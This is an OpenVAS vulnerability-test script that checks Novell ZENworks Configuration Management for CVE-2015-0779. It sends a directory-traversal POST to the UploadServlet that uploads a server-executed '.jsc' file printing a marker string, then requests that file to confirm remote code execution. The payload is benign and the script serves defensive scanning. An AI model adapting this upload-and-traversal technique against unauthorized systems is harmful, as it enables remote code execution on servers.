###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_novell_zenworks_configuration_management_cve_2015_0779.nasl 13997 2019-03-05 12:43:01Z cfischer $
#
# Novell ZENworks Configuration Management Arbitrary File Upload
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2015 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105251");
  script_cve_id("CVE-2015-0779");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("$Revision: 13997 $");

  script_name("Novell ZENworks Configuration Management Arbitrary File Upload");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2015/Apr/21");

  script_tag(name:"vuldetect", value:"Try to upload and execute a '.jsc' file.");

  script_tag(name:"insight", value:"Remote code execution via file upload and directory traversal in '/zenworks/UploadServlet'");
  script_tag(name:"solution", value:"Updates are available.");

  script_tag(name:"summary", value:"The remote ZENworks Configuration Management is prone to an unauthenticated
  arbitrary file upload vulnerability");

  script_tag(name:"affected", value:"ZENworks Configuration Management < 11.3.2");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:43:01 +0100 (Tue, 05 Mar 2019) $");
  script_tag(name:"creation_date", value:"2015-04-10 20:01:11 +0200 (Fri, 10 Apr 2015)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2015 Greenbone Networks GmbH");
  script_dependencies("gb_novell_zenworks_configuration_management_detect.nasl");
  script_require_ports("Services/www", 443);
  script_mandatory_keys("novell_zenworks_configuration_management/installed");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port( default:443 );

url = '/zenworks/UploadServlet';
req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if( !buf || "ZENworks File Upload" >!< buf)
  exit( 0 );

str = 'xt_test_';
rand = rand() + '_';

ex = '<%out.print("' + str  + rand + '".replace(' + "'x','v'" + '));out.print(Byte.decode("0x2A"));%>';

host = http_host_name(port:port);
len = strlen(ex);

vtstrings = get_vt_strings();
file = vtstrings["lowercase_rand"] + '_cve_2015_0779.jsc';

paths = make_list("../../../opt/novell/zenworks/share/tomcat/webapps/", "../webapps/");

foreach path ( paths )
{
  vuln_url = '/zenworks/UploadServlet?uid=' + path  + 'zenworks/jsp/core/upload&filename=';
  req = 'POST ' + vuln_url + file  + ' HTTP/1.1\r\n' +
        'Host: ' + host + '\r\n' +
        'Content-Type: application/octet-stream\r\n' +
        'Content-Length: ' + len + '\r\n' +
        '\r\n' + ex;
  buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if( ! buf || "<status>success</status>" >!< buf )
    continue;

  upload_url = '/zenworks/jsp/core/upload/' + file;
  req = http_get(item:upload_url, port:port);
  buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

  if( 'vt_test_' + rand + '42' >< buf ) {
    report  = report_vuln_url(port:port, url:upload_url);
    report += '\n' + report_vuln_url(port:port, url:vuln_url);
    security_message(port:port, data:report);
    exit( 0 );
  }
}

exit( 99 );